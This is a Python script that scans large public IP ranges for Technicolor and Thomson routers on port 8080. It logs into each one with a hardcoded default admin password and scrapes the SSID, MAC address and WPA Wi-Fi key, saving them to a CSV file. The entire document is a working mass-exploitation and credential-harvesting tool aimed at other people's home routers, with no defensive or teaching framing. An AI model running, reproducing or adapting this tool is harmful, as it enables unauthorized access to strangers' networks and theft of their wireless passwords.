# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import socket
import csv
import time

c = open('db.csv', 'r')
f = csv.reader(c)
lista = list(f)
linea = lista[-2:][0:]
k = linea[0][0]
ip = str(k)

def i():
    result = ip.split(".")
    f = 0
    h = []
    for x in result:
        f = f + 1
        if f==1:
            h.append(x)
            
        elif f==2:
            h.append(x)
            
        elif f==3:
            h.append(x)
            
        else :
            h.append(x)
    
    
    return h
    
def t(p):
    a = int(p[0])
    b = int(p[1])
    c = int(p[2])
    d = int(p[3])
    tech = 0
    tom = 0
    router = open('db.csv','a+')
    x = open('db.csv','r')
    host = csv.reader(x, delimiter=',')
    header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    router.write('\n')#181.51.152.141 186.87.244.18
    for i in range(186,256):
        for j in range(87, 256):
            for k in range(244,256):
                for l in range(0,256):
                    ip = str(i)+'.'+str(j)+'.'+str(k)+'.'+str(l)
                    
                    try:
                       
                        
                        r1 = requests.get('http://'+ip+':8080/', timeout=2, headers=header)
                        
                        head = r1.headers
                        b = 'WWW-Authenticate' in head
                        if b==True:
                            thom = 'Basic realm="Thomson"'
                            techni = 'Basic realm="Technicolor"'
                            r = requests.get('http://'+ip+':8080/', timeout=None)
                            n = r.headers['WWW-Authenticate']
                            if n == techni: ##Technicolor
                                tech = tech+1
                                try:
                                    
                                    r2 = requests.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                    #print r2.headers
                                    guess = requests.get('http://'+ip+':8080/wlanGuestNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                    bs1 = BeautifulSoup(r2.content, "html.parser")
                                    #print guess.headers
                                    for name in bs1.find_all("td", align="middle"):
                                        t = name.text[16:]
                                        ma = t[-19:]
                                        mac = ma[1:-1]
                                        ssid = t[0:-19]
                                        for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                            router.write(ip+','+'Technicolor'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+',enable'+'\n')
                                            print ip+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]+'......Guess Enable'
                                
                                except requests.exceptions.ConnectionError: 
                                    
                                    rn = requests.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                    bsn = BeautifulSoup(rn.content, "html.parser")
                                    for name in bsn.find_all("td", align="middle"):
                                        t = name.text[24:]
                                        ma = t[-19:]
                                        mac = ma[1:-1]
                                        ssid = t[0:-19]
                                        for pwd in bsn.find_all("input", {'name':"WpaPreSharedKey"}):
                                            router.write(ip+','+'Technicolor'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+',disable'+'\n')
                                            print ip+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]+'......Guess Disable'
                                            
                            
                            elif n==thom: ##Thomson
                                tom = tom+1
                                r3 = requests.get('http://' + ip + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                r4 = requests.get('http://' + ip + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None, headers=header)
                                parser = r4.content
                                bs1 = BeautifulSoup(parser, "html.parser")
                                for name in bs1.find_all("td", align="middle"):
                                    t = name.text[16:]
                                    ma = t[-19:]
                                    mac = ma[1:-1]
                                    ssid = t[0:-19]
                                    for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                        router.write(ip+','+'Thomson'+','+str(mac)+','+str(ssid)+','+str(pws["value"])+','+'\n')
                                        print ip+".....Thomson..............."+str(mac)+'.......'+str(ssid)+"....."+pws["value"]
                                        
                                
                            
                    except requests.exceptions.Timeout:
                        pass
                    except KeyError:
                        pass
                    except socket.timeout:
                        pass
                    except requests.exceptions.ConnectionError:
                        pass
    router.close()
    print str(tech)+" technicolor"
    print str(tom)+" tomson"
    print str(tech+tom)+" En total"
        
        
u = i()
t(u)
    
        

    
   
      
        





        
        
       
            